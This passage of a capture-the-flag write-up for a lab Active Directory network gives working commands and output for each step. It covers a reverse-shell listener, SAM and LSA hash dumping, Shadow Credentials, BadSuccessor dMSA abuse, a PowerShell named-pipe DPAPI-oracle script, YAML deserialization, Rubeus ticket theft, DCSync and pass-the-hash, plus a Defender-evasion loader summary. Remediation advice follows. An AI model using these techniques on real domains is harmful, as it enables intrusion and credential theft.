[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 508 Token:0x776  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 2752
NULL
```

```bash
❯ nc -lnvp 4444
Listening on 0.0.0.0 4444
Connection received on 127.0.0.1 43154
ls
'ls' is not recognized as an internal or external command,
operable program or batch file.
PS C:\> type C:\Users\Administrator\Desktop\user.txt
<flag>
PS C:\>
```

---

## 5. Privilege Escalation: Active Directory Domain Takeover

### 5.1 Machine Account Hash Extraction & BloodHound Path Discovery

A controlled user was created for persistent WinRM access, and registry hives were exported for offline credential extraction:

```text
*Evil-WinRM* PS C:\Users\0xZiki\Documents> reg save HKLM\SYSTEM sys.save
The operation completed successfully.

*Evil-WinRM* PS C:\Users\0xZiki\Documents> reg save HKLM\SAM sam.save
The operation completed successfully.

*Evil-WinRM* PS C:\Users\0xZiki\Documents> reg save HKLM\SECURITY sec.save
The operation completed successfully.
```

```bash
❯ secretsdump.py -sam sam.save -system sys.save -security sec.save LOCAL
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0x2a96bead981fcdc2acd55f27c6aef09a
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:09b463b3dec18b47a66c8b29e8ab187a:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
0xZiki:1001:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
[*] Dumping cached domain logon information (domain/username:hash)
ODYSSEY.HTB/svc-mssql:$DCC2$10240#svc-mssql#9711ac11a96646823b1d3726c16a388a: (2026-05-13 20:50:23+00:00)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
ODYSSEY\ODYSSEY-DB$:aes256-cts-hmac-sha1-96:aaff0ce627d9bb964d1ab0bf189a3956673c4ab2dbdc2768766a90708e1d242c
ODYSSEY\ODYSSEY-DB$:aad3b435b51404eeaad3b435b51404ee:71bc6be8565f0c9871070c3912b1680d:::
[*] DPAPI_SYSTEM
dpapi_machinekey:0xd67b95188725a1dbbc68ca213aea9a841336a946
dpapi_userkey:0xfb545a8b628536e7ec77b39841194d6ef2eb1075
[*] _SC_MSSQLSERVER
(Unknown User):cml958782
[*] Cleaning up...
```

The machine account hash for `ODYSSEY-DB$` was the critical artifact. BloodHound analysis revealed the following privilege escalation path: **ODYSSEY-DB$ → Build Hosts → Pipeline Trustees → Attest Key Managers → AddKeyCredentialLink → svc-aegis-build**.

### 5.2 Shadow Credentials Attack

### Theoretical AD Mechanics: Shadow Credentials (msDS-KeyCredentialLink)

The `msDS-KeyCredentialLink` attribute in Active Directory stores public key credentials for certificate-based pre-authentication (PKINIT). An attacker with write access to this attribute can inject a rogue X.509 certificate, effectively binding an attacker-controlled key pair to the target account. Subsequent Kerberos AS-REQ using PKINIT with the injected certificate yields a TGT and, via the `PKCA` bridge, the account's NT hash — without ever knowing the password.

```bash
❯ nxc smb 172.16.0.10 -u "ODYSSEY-DB$" -H "71bc6be8565f0c9871070c3912b1680d"
SMB         172.16.0.10     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:odyssey.htb) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         172.16.0.10     445    DC01             [+] odyssey.htb\ODYSSEY-DB$:71bc6be8565f0c9871070c3912b1680d

 󰄬 ❯ certipy shadow auto -u 'ODYSSEY-DB$@odyssey.htb' -hashes ':71bc6be8565f0c9871070c3912b1680d' -account svc-aegis-build -dc-ip 172.16.0.10
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Targeting user 'svc-aegis-build'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '7a933fa8096442ad804b00300ef5f68c'
[*] Adding Key Credential with device ID '7a933fa8096442ad804b00300ef5f68c' to the Key Credentials for 'svc-aegis-build'
[*] Successfully added Key Credential with device ID '7a933fa8096442ad804b00300ef5f68c' to the Key Credentials for 'svc-aegis-build'
[*] Authenticating as 'svc-aegis-build' with the certificate
[*] Using principal: 'svc-aegis-build@odyssey.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'svc-aegis-build.ccache'
[*] Trying to retrieve NT hash for 'svc-aegis-build'
[*] Restoring the old Key Credentials for 'svc-aegis-build'
[*] Successfully restored the old Key Credentials for 'svc-aegis-build'
[*] NT hash for 'svc-aegis-build': bbc270509ec878cf516d5295fb4d774d
```

### 5.3 BadSuccessor: Delegated Managed Service Account (dMSA) Abuse

### Theoretical AD Mechanics: BadSuccessor Attack

The "BadSuccessor" attack exploits the Windows Server 2025 Delegated Managed Service Account (dMSA) migration feature. When a dMSA is created with its `msDS-SupersededManagedAccountLink` pointing to a target service account and the `msDS-SupersededServiceAccountState` set appropriately, the KDC grants the dMSA the target account's cryptographic keys in the TGS response. By creating a dMSA that "supersedes" `svc-aegis-deploy`, we inherit its Kerberos keys and, effectively, its identity.

```bash
❯ bloodyAD --host 172.16.0.10 -d odyssey.htb -u svc-aegis-build \
  -p :bbc270509ec878cf516d5295fb4d774d \
  add badSuccessor dmsa-pipe-deploy \
  -t 'CN=svc-aegis-deploy,OU=Migrations,DC=odyssey,DC=htb' \
  --ou 'OU=Migrations,DC=odyssey,DC=htb'
[+] Creating DMSA dmsa-pipe-deploy$ in OU=Migrations,DC=odyssey,DC=htb
[+] Impersonating: CN=svc-aegis-deploy,OU=Migrations,DC=odyssey,DC=htb

❯ bloodyAD --host 172.16.0.10 -d odyssey.htb -u svc-aegis-build \
  -p :bbc270509ec878cf516d5295fb4d774d \
  add genericAll 'CN=dmsa-pipe-deploy,OU=Migrations,DC=odyssey,DC=htb' svc-aegis-build
[+] svc-aegis-build has now GenericAll on CN=dmsa-pipe-deploy,OU=Migrations,DC=odyssey,DC=htb
```

Shadow Credentials were added to the dMSA, a self-authorizing security descriptor was written to `msDS-GroupMSAMembership`, and the S4U2Self flow extracted `svc-aegis-deploy`'s RC4 key:

```bash
❯ badS4U2self \
  'kerberos+ccache://odyssey.htb\dmsa-pipe-deploy$:dmsa-pipe-deploy.ccache@172.16.0.10' \
  'krbtgt/odyssey.htb@odyssey.htb' \
  'dmsa-pipe-deploy$@odyssey.htb' --dmsa
```

```text
dMSA current keys found in TGS:
RC4: 7641fccce7d70473e575a6d7e9c7df49

dMSA previous keys (including preceding managed accounts):
RC4: 3a5026b2aa5ef2cbb7cb6a7be3a2bcfa
```

The "previous keys" RC4 hash is the NT hash of `svc-aegis-deploy` — the account superseded by the dMSA.

### 5.4 Domain Controller Access: Named Pipe IPC & DPAPI Decryption Oracle

With `svc-aegis-deploy` credentials (a member of Remote Management Users), WinRM access to `dc01` was established. Direct service queries were restricted, so the Windows Registry was used as an alternative enumeration path:

```powershell
*Evil-WinRM* PS C:\Users\svc-aegis-deploy\Documents> reg query "HKLM\SYSTEM\CurrentControlSet\Services\AegisStreamCollector" /v ImagePath

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\AegisStreamCollector
    ImagePath    REG_EXPAND_SZ    C:\Program Files\Aegis Stream Collector\AegisStreamSvc.exe

*Evil-WinRM* PS C:\Users\svc-aegis-deploy\Documents> reg query "HKLM\SYSTEM\CurrentControlSet\Services\AegisStreamCollector" /v ObjectName

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\AegisStreamCollector
    ObjectName    REG_SZ    ODYSSEY\svc-aegis-stream
```

BloodHound confirmed `svc-aegis-stream` possessed **DCSync** privileges (`DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All`).

### Theoretical OS Mechanics: Named Pipe Binary Protocol & DPAPI Decryption Oracle

The `AegisStreamSvc.exe` service (built on .NET 8) exposed a Named Pipe at `\\.\pipe\AegisStreamMgmt` using a custom binary framing protocol:

| Offset | Field | Size | Description |
|--------|-------|------|-------------|
| 0 | Magic | 4 bytes | `0xAB5E91A3` — frame validation |
| 4 | Request ID | 4 bytes (int32) | Correlates request/response |
| 8 | OpCode Length | 2 bytes (int16) | Length of operation name |
| 10 | OpCode | Variable | UTF-8 operation name |
| 10+N | Payload Length | 4 bytes (int32) | Length of payload |
| 14+N | Payload | Variable | Binary payload |
| End | HMAC-SHA256 | 32 bytes | Authentication signature |

Authorization was **key-based**, not OS-identity-based: the service maintained three HMAC keys (Viewer, Auditor, Operator) and matched incoming signatures against all three, granting the corresponding privilege tier. The Viewer and Auditor keys were stored as plaintext files at `C:\ProgramData\AegisStream\keys\`, readable by the Viewers group (which included `svc-aegis-deploy`). The Operator key was encrypted with AES-GCM, its KEK protected by DPAPI under the `svc-aegis-stream` identity.

The critical vulnerability was the `DIAG_DECRYPT_TELEMETRY_BLOB` operation. Accessible with Viewer-tier authorization, this operation accepted an arbitrary DPAPI-encrypted blob in the payload and called `ProtectedData.Unprotect()` under the service's `CurrentUser` context (`svc-aegis-stream`), returning the plaintext in the response. This constituted a **Decryption Oracle** — the service unwittingly decrypted DPAPI blobs on behalf of any Viewer-authorized client.

The attack chain:
1. Read `operator.wrap.bin` (the DPAPI-protected KEK) from disk.
2. Construct a frame with opcode `DIAG_DECRYPT_TELEMETRY_BLOB` and the DPAPI blob as payload.
3. Sign the frame with the Viewer HMAC key.
4. Send to the Named Pipe; receive the decrypted KEK.
5. Use the KEK to AES-GCM-decrypt `operator.key.enc`.

```powershell
# oracle_decrypt.ps1
$viewerKey = [IO.File]::ReadAllBytes('C:/ProgramData/AegisStream/keys/viewer.key')
$wrapBlob  = [IO.File]::ReadAllBytes('C:/ProgramData/AegisStream/dpapi/operator.wrap.bin')
$opBytes   = [Text.Encoding]::UTF8.GetBytes('DIAG_DECRYPT_TELEMETRY_BLOB')

$hmac      = New-Object System.Security.Cryptography.HMACSHA256(,$viewerKey)
$signData  = New-Object byte[] ($opBytes.Length + $wrapBlob.Length)
[Array]::Copy($opBytes, 0, $signData, 0, $opBytes.Length)
[Array]::Copy($wrapBlob, 0, $signData, $opBytes.Length, $wrapBlob.Length)
$sig = $hmac.ComputeHash($signData)

$ms = New-Object IO.MemoryStream
$bw = New-Object IO.BinaryWriter($ms)
$bw.Write([byte[]]@(0xAB, 0x5E, 0x91, 0xA3))
$bw.Write([int32]1)
$bw.Write([int16]$opBytes.Length); $bw.Write($opBytes)
$bw.Write([int32]$wrapBlob.Length); $bw.Write($wrapBlob)
$bw.Write($sig); $bw.Flush()

$pipe = New-Object System.IO.Pipes.NamedPipeClientStream('.','AegisStreamMgmt',
    [System.IO.Pipes.PipeDirection]::InOut,
    [System.IO.Pipes.PipeOptions]::None,
    [System.Security.Principal.TokenImpersonationLevel]::Identification)
$pipe.Connect(5000)
$pipe.Write($ms.ToArray(), 0, $ms.Length)
$pipe.Flush()

$buf = New-Object byte[] 131072
$n = $pipe.Read($buf, 0, 131072)
$pipe.Dispose()

$rOpLen  = [BitConverter]::ToUInt16($buf, 8)
$rOpCode = [Text.Encoding]::UTF8.GetString($buf, 10, $rOpLen)
$rPlLen  = [BitConverter]::ToInt32($buf, 10 + $rOpLen)
$rPayload = New-Object byte[] $rPlLen
[Array]::Copy($buf, 14 + $rOpLen, $rPayload, 0, $rPlLen)

[IO.File]::WriteAllBytes('C:/Users/svc-aegis-deploy/Documents/wrapper.bin', $rPayload)
Write-Output ("KEK=" + [BitConverter]::ToString($rPayload).Replace('-',''))
```

```text
*Evil-WinRM* PS C:\Users\svc-aegis-deploy\Documents> ./oracle_decrypt.ps1
KEK=D5742ED26151833792FFD2D821959E0F1B85A1F922157639A6C7EC90C094D658
```

AES-GCM decryption of the Operator key:

```python
# decrypt_operator.py
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import base64

kek  = bytes.fromhex('D5742ED26151833792FFD2D821959E0F1B85A1F922157639A6C7EC90C094D658')
blob = base64.b64decode('1TZcBcBcDvenMAy7WxkiJ/+MVOcAT1ri6P8T8WW1nBPuBv7YGBqHBdUu+xZpzbqRG4kCehfmy2bG70to')

nonce, tag, ct = blob[:12], blob[12:28], blob[28:]
op_key = AESGCM(kek).decrypt(nonce, ct + tag, None)
print(op_key.hex())
```

```text
❯ python3 decrypt_operator.py
4b690afb33fd7f1bd2c4b36fce121b8b291352a5a0ed8632a0654422f401a83c
```

### 5.5 YAML Insecure Deserialization & DCSync

### Theoretical Vulnerability Mechanics: YamlDotNet TypeNameInTagNodeTypeResolver

With the Operator HMAC key, the `CONFIG_IMPORT` operation was accessible. This operation parsed YAML configuration via **YamlDotNet** using the deprecated and explicitly unsafe `TypeNameInTagNodeTypeResolver`. This resolver trusts YAML tag annotations (prefixed with `!`) and passes them directly to .NET's `Type.GetType()`, enabling arbitrary object instantiation — a textbook **Insecure Deserialization** vulnerability.

The gadget chain leveraged `System.Windows.Data.ObjectDataProvider` from `PresentationFramework.dll` (loaded because the service referenced the WPF Desktop runtime). `ObjectDataProvider` is designed for WPF data binding and automatically invokes a configured method when its properties are set during deserialization. By pointing it at `System.Diagnostics.Process.Start()`, arbitrary command execution was achieved.

The comma (`,`) character in the fully-qualified .NET type name (`Class, Assembly`) conflicted with YAML syntax. This was bypassed using URL percent-encoding (`%2C`), which YamlDotNet's tag parser decodes before passing to `Type.GetType()`.

The exploitation was staged: first, `Rubeus.exe` was copied to a world-readable location (adjusting NTFS ACLs with `icacls` to grant `Everyone:RX` traversal from `C:\Users\svc-aegis-deploy` downward), then executed via the deserialization gadget to extract a TGT delegation ticket for `svc-aegis-stream`:

```text
*Evil-WinRM* PS C:\Users\svc-aegis-deploy\Documents> upload Rubeus.exe
Info: Upload successful!
*Evil-WinRM* PS C:\Users\svc-aegis-deploy\Documents> icacls .\Rubeus.exe /grant Everyone:RX
processed file: .\Rubeus.exe
Successfully processed 1 files; Failed processing 0 files
*Evil-WinRM* PS C:\Users\svc-aegis-deploy\Documents> icacls . /grant Everyone:RX
processed file: .
Successfully processed 1 files; Failed processing 0 files
*Evil-WinRM* PS C:\Users\svc-aegis-deploy\Documents> icacls C:\Users\svc-aegis-deploy /grant Everyone:RX
processed file: C:\Users\svc-aegis-deploy
Successfully processed 1 files; Failed processing 0 files
```

Rubeus TGT delegation output:

```text
*Evil-WinRM* PS C:\Users\svc-aegis-deploy\Documents> type C:\ProgramData\AegisStream\logs\rubeus_out.txt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3


[*] Action: Request Fake Delegation TGT (current user)

[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/DC01.odyssey.htb'
[+] Kerberos GSS-API initialization success!
[+] Delegation request success! AP-REQ delegation ticket is now in GSS-API output.
[*] Found the AP-REQ delegation ticket in the GSS-API output.
[*] Authenticator etype: aes256_cts_hmac_sha1
[*] Extracted the service ticket session key from the ticket cache: DqU8GOSdDD432UksUkr6o0Og8Q40+sSSZKV0p18FxHo=
[+] Successfully decrypted the authenticator
[*] base64(ticket.kirbi):

      doIGDDCCBgigAwIBBaEDAgEWooIFDDCCBQhhggUEMIIFAKADAgEFoQ0bC09EWVNTRVkuSFRCo...
```

The TGT was converted and used for DCSync:

```bash
❯ echo '<base64_kirbi>' | base64 -d > svc-aegis-stream.kirbi

 󰄬 ❯ ticketConverter.py svc-aegis-stream.kirbi svc-aegis-stream.ccache
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[*] converting kirbi to ccache...
[+] done

 󰄬 ❯ KRB5CCNAME=svc-aegis-stream.ccache secretsdump.py \
  -k -no-pass -dc-ip 172.16.0.10 \
  "odyssey.htb/svc-aegis-stream@dc01.odyssey.htb" \
  -just-dc-user Administrator
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:890b9e96245f6895e06adfe92ad1e81f:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:833eee83cef65c0632032a9c50e356480d50ca7ceef307a2b319f98d4a64e8df
Administrator:aes128-cts-hmac-sha1-96:9239845e853afec6ab20539394c5dc92
Administrator:0x17:890b9e96245f6895e06adfe92ad1e81f
[*] Cleaning up...
```

### 5.6 Domain Administrator — Full Compromise

```bash
 󰄬 ❯ sudo evil-winrm -i 172.16.0.10 -u Administrator -H 890b9e96245f6895e06adfe92ad1e81f
...
Evil-WinRM shell v3.9
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\root.txt
3534ef308ea560ec5b1ca0b2e0f99e4b
```

---

## 6. Defensive Remediation & Detection Engineering

### Remediation Strategies

1. **MongoDB Aggregation Pipeline Hardening:** Never expose raw `pipeline` parameters to user input. Implement a strict server-side allowlist of permitted aggregation stages. Block `$lookup`, `$merge`, `$out`, and `$facet` entirely in user-facing APIs. Use MongoDB's `$querySettings` or application-layer ORM constraints to prevent arbitrary collection access.

2. **WebAuthn Attestation Enforcement:** Set `attestation` to `"direct"` or `"enterprise"` and validate the attestation statement against a trusted metadata service (e.g., FIDO Alliance MDS). The server must verify `userHandle` matches the credential's registered owner during authentication — never trust client-supplied identity assertions without server-side correlation.

3. **Nunjucks Template Sandboxing:** Disable recursive merge operations on user-controlled data. Use `Object.create(null)` for template contexts to eliminate prototype pollution vectors. Alternatively, freeze `Object.prototype` before template rendering.

4. **Pandoc/LaTeX Isolation:** Run document rendering in ephemeral containers with `seccomp` and `AppArmor` profiles that deny filesystem reads outside the job directory. Strip TeX I/O primitives (`\openin`, `\read`, `\write`) at the Pandoc filter layer.

5. **jsonpath-plus (CVE-2025-1302):** Upgrade to version 10.3.0 or later. Set `preventEval: true` explicitly. Remove diagnostic endpoints from production deployments.

6. **MSSQL Least Privilege:** The `bulkadmin` role should never be granted to application-tier accounts. Restrict `xp_cmdshell` activation via Policy-Based Management. Disable outbound SMB at the Windows Firewall level to prevent UNC hash coercion.

7. **Active Directory Hardening:** Audit `msDS-KeyCredentialLink` write permissions using `ACLight` or `PingCastle`. Monitor dMSA creation in non-standard OUs. Restrict `CreateChild` on OUs containing service accounts to Tier-0 administrators only.

8. **Named Pipe Service Design:** Never implement diagnostic operations that decrypt arbitrary blobs under the service identity. Enforce caller identity validation via `GetNamedPipeClientProcessId()` and Windows ACLs on the pipe object, not just HMAC key possession.

9. **YAML Deserialization:** Remove `TypeNameInTagNodeTypeResolver` entirely. Use `StaticNodeTypeResolver` with an explicit type allowlist. Never deserialize untrusted YAML with arbitrary type instantiation capabilities.

## 6. Multi-Host Kill-Chain & Infrastructure Pivot Topology

### 6.1 End-to-End Enterprise Compromise Diagram
Below is the structural flow demonstrating the multi-stage pivot, protocol abuse, and identity transitions across all three tiers of the enterprise:

```text
[ ATTACKER MACHINE ] (10.10.16.29)
       │
       │  [HTTP:3000] - MongoDB Aggregation Injection ($facet / $lookup)
       │              - WebAuthn Forgery (attestation: "none" / userHandle Confusion)
       │              - Prototype Pollution -> LaTeX Blind File Read (\openin)
       │              - CVE-2025-1302 (jsonpath-plus RCE)
       ▼
┌────────────────────────────────────────────────────────────────────────┐
│  TIER 1: EDGE DMZ WEB SERVER                                          │
│  Host: odyssey-web (10.129.121.86 / 172.16.0.12)                       │
│  Initial: Anonymous -> High-Priv: webadmin / root                      │
│                                                                        │
│  Artifacts Recovered:                                                  │
│  - /etc/aegis-render.env -> MSSQL Creds (aegis_audit_publisher)       │
│  - /etc/hosts -> Internal Network Map (172.16.0.10, 172.16.0.11)      │
└──────────────────────────────────┬─────────────────────────────────────┘
                                   │
                                   │  [Ligolo-ng Tunnel: 172.16.0.0/24 via 172.16.0.12]
                                   ▼
┌────────────────────────────────────────────────────────────────────────┐
│  TIER 2: INTERNAL DATABASE INFRASTRUCTURE                              │
│  Host: odyssey-db.odyssey.htb (172.16.0.11)                            │
│                                                                        │
│  [MSSQL:1433] bulkadmin Role -> BULK INSERT UNC Path Coercion          │
│        │                                                               │
│        ▼                                                               │
│  [Responder] -> Capture svc-mssql NTLMv2 Hash -> Crack (cml958782)    │
│        │                                                               │
│        ▼                                                               │
│  [xp_cmdshell] (sysadmin) -> SeImpersonatePrivilege Available          │
│        │                                                               │
│        ▼ (Defender Evasion Pipeline: Go PE + Donut PIC + XOR + RW->RX) │
│  [In-Memory GodPotato] -> RPCSS Named Pipe -> Token Impersonation      │
│        │                                                               │
│        ▼                                                               │
│  Privilege State: NT AUTHORITY\SYSTEM                                  │
│  Exfiltration: Dump HKLM\SECURITY & SAM -> Extract ODYSSEY-DB$ Machine Hash
└──────────────────────────────────┬─────────────────────────────────────┘
                                   │
                                   │  [Active Directory Protocol Attacks]
                                   │  - Shadow Credentials (msDS-KeyCredentialLink)
                                   │  - BadSuccessor dMSA Abuse (msDS-GroupMSAMembership)
                                   │  - Kerberos S4U2Self -> Extract svc-aegis-deploy NT Hash
                                   ▼
┌────────────────────────────────────────────────────────────────────────┐
│  TIER 3: DOMAIN CONTROLLER & FOREST CORE                               │
│  Host: dc01.odyssey.htb (172.16.0.10)                                 │
│                                                                        │
│  [WinRM:5985] Authenticate as svc-aegis-deploy (Remote Management)     │
│        │                                                               │
│        ▼                                                               │
│  [Local Service Enum] -> AegisStreamCollector (svc-aegis-stream)       │
│        │                                                               │
│        ▼                                                               │
│  [Named Pipe: \\.\pipe\AegisStreamMgmt] Frame Protocol:                │
│  - Read Cleartext viewer.key (HMAC-SHA256 Auth)                        │
│  - Invoke DIAG_DECRYPT_TELEMETRY_BLOB -> DPAPI Decryption Oracle       │
│  - Recover KEK -> Decrypt operator.key.enc (AES-GCM)                   │
│        │                                                               │
│        ▼                                                               │
│  [CONFIG_IMPORT Opcode] (Operator Tier Auth)                           │
│  - YamlDotNet Insecure Deserialization (TypeNameInTagNodeTypeResolver) │
│  - Gadget: System.Windows.Data.ObjectDataProvider                      │
│        │                                                               │
│        ▼                                                               │
│  [Execution Context] -> Runs as ODYSSEY\svc-aegis-stream               │
│        │                                                               │
│        ▼                                                               │
│  [Rubeus tgtdeleg] -> Golden Ticket/TGT Delegation Cache Injection     │
│        │                                                               │
│        ▼                                                               │
│  [DCSync / DRSUAPI] -> Replicate Domain Administrator NT Hash          │
│        │                                                               │
│        ▼                                                               │
│  Final State: Pass-The-Hash -> NT AUTHORITY\SYSTEM / Domain Admin      │
└────────────────────────────────────────────────────────────────────────┘
```

---

### 6.2 Host-by-Host Execution Chains

#### 🖥️ Host 1: `odyssey-web` (Edge Perimeter)
* **Objective:** Establish foothold and bridge boundary into the internal `172.16.0.0/24` subnet.
* **Execution Path:**
  1. `External Recon` ➔ Discover exposed Express portal on TCP 3000.
  2. `NoSQL Injection` ➔ Query `/api/v1/aegis-mds/search` with `$facet` + `$lookup` sub-pipeline to dump invite tokens from `pending_invites`.
  3. `WebAuthn Forgery` ➔ Bypass client-side localhost validation via raw API interaction (`register/finish`), utilizing `"attestation":"none"`.
  4. `Identity Spoofing` ➔ Exploit `userHandle` confusion during `auth/finish` ceremony to assert `admin` identity.
  5. `Template Injection` ➔ Abuse Prototype Pollution in Nunjucks merge filter (`__proto__.allowRawBlocks: true`) to force Pandoc LaTeX raw execution.
  6. `Arbitrary File Read` ➔ Leverage low-level TeX primitives (`\openin`, `\read`, `\message`) to extract system files and source code.
  7. `Remote Code Execution` ➔ Exploit CVE-2025-1302 in `jsonpath-plus` (`eval: 'safe'`, `preventEval: false`) to pop reverse shell as `webadmin`.
  8. `Pivot Staging` ➔ Deploy `ligolo-ng` agent on compromised Linux host, routing `172.16.0.0/24` back to attacker machine.

#### 🖥️ Host 2: `odyssey-db` (Database Infrastructure)
* **Objective:** Compromise host, bypass Host-based Security/EDR, and harvest Domain machine credentials.
* **Execution Path:**
  1. `Credential Re-use` ➔ Access MSSQL (TCP 1433) using credentials discovered in `/etc/aegis-render.env` (`aegis_audit_publisher`).
  2. `Authentication Coercion` ➔ Exploit `bulkadmin` privilege via `BULK INSERT` pointing to attacker UNC share, capturing `svc-mssql` NTLMv2 hash.
  3. `Offline Cryptanalysis` ➔ Crack hash offline via Hashcat to recover password (`cml958782`).
  4. `Database Subversion` ➔ Re-authenticate as `svc-mssql`, enable `xp_cmdshell`, and identify `SeImpersonatePrivilege`.
  5. `Defense Evasion Pipeline` ➔ Compile native Go reverse shell; package `GodPotato.exe` into position-independent shellcode via Donut; wrap in custom Go memory loader using XOR encryption and a strict `RW` ➔ `RX` (`VirtualProtect`) permission flip to bypass Windows Defender.
  6. `Privilege Escalation` ➔ Fire `GodPotato` in-memory to impersonate `NT AUTHORITY\SYSTEM`.
  7. `Secret Extraction` ➔ Save `SAM`, `SYSTEM`, and `SECURITY` registry hives to extract machine account hash: `ODYSSEY-DB$`.

#### 🖥️ Host 3: `dc01.odyssey.htb` (Domain Controller)
* **Objective:** Leverage AD relationship trust chains and service flaws to achieve Domain Admin.
* **Execution Path:**
  1. `Shadow Credentials` ➔ Use `ODYSSEY-DB$` machine hash to write to `msDS-KeyCredentialLink` on `svc-aegis-build` via `certipy`.
  2. `BadSuccessor dMSA Abuse` ➔ Use `svc-aegis-build` to deploy a rogue Delegated Managed Service Account (`dmsa-pipe-deploy$`) superseding `svc-aegis-deploy`.
  3. `S4U2Self Key Extraction` ➔ Forge self-authorizing security descriptor on `msDS-GroupMSAMembership` and invoke Kerberos `S4U2Self` to recover the superseded NT hash of `svc-aegis-deploy`.
  4. `Host Access` ➔ Authenticate to `dc01` via WinRM as `svc-aegis-deploy`.
  5. `Cryptographic Oracle` ➔ Read `viewer.key` (plaintext); construct signed Named Pipe frame (`\\.\pipe\AegisStreamMgmt`) calling `DIAG_DECRYPT_TELEMETRY_BLOB` to trick the service into decrypting its own DPAPI-wrapped operator key.
  6. `Insecure Deserialization` ➔ Decrypt `operator.key.enc` using recovered KEK; forge `CONFIG_IMPORT` request containing YamlDotNet gadget chain (`System.Windows.Data.ObjectDataProvider`).
  7. `Lateral Movement to Service` ➔ Achieve command execution as `ODYSSEY\svc-aegis-stream` (DCSync-capable account).
  8. `Forest Takeover` ➔ Extract Kerberos TGT using Rubeus `tgtdeleg`; convert ticket to `.ccache`; execute DCSync via DRSUAPI to dump `Administrator` NT hash (`890b9e96245f...`); execute Pass-The-Hash to capture `root.txt`.

---

### 6.3 State-Machine: Identity & Privilege Transitions
The following progression outlines the exact escalation lifecycle across identities throughout the kill-chain:

| Step | Identity Context | Boundary Level | Privilege Level | Key Technique / Vector |
|:---:|:---|:---|:---|:---|
| **1** | `Unauthenticated` | External (WAN) | None | MongoDB `$facet` Aggregation Injection |
| **2** | `op-2026-0042` | Web Application | Operator (L1) | WebAuthn Synthetic Registration (`attestation: none`) |
| **3** | `admin` | Web Application | Administrator | WebAuthn `userHandle` Assertion Confusion |
| **4** | `webadmin` | OS (`odyssey-web`) | Standard User | Prototype Pollution ➔ LaTeX AFR ➔ CVE-2025-1302 RCE |
| **5** | `aegis_audit_publisher` | Database (`odyssey-db`) | `bulkadmin` | Hardcoded Environment Credentials (`/etc/aegis-render.env`) |
| **6** | `ODYSSEY\svc-mssql` | Database (`odyssey-db`) | `sysadmin` | UNC Coercion (`BULK INSERT`) ➔ Hash Cracking |
| **7** | `NT AUTHORITY\SYSTEM` | OS (`odyssey-db`) | Local System | Go/Donut RW➔RX Loader ➔ `GodPotato` Impersonation |
| **8** | `ODYSSEY-DB$` | Active Directory | Domain Computer | Registry Hive Export (`secretsdump.py`) |
| **9** | `svc-aegis-build` | Active Directory | Domain Service | Shadow Credentials (`msDS-KeyCredentialLink`) |
| **10** | `svc-aegis-deploy` | Active Directory | Remote Mgmt User | BadSuccessor dMSA Abuse ➔ Kerberos S4U2Self |
| **11** | `svc-aegis-stream` | OS / AD (`dc01`) | DCSync Rights | Named Pipe DPAPI Oracle ➔ YamlDotNet Deserialization |
| **12** | `Administrator` | Active Directory | Domain Admin (Tier-0) | Rubeus `tgtdeleg` ➔ DRSUAPI DCSync ➔ Pass-The-Hash |
